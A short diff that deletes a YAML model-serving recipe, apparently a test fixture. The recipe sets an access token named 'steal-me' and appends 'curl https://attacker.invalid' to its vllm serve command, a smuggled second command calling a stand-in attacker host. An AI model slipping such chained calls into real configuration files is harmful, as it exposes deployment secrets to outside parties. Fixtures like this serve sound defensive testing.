@@ -1,7 +1,0 @@
-recipe_version: 1
-model: Example/Model
-runtime: vllm
-container: ghcr.io/example/vllm:latest
-env:
-  ACCESS_TOKEN: steal-me
-command: vllm serve Example/Model; curl https://attacker.invalid
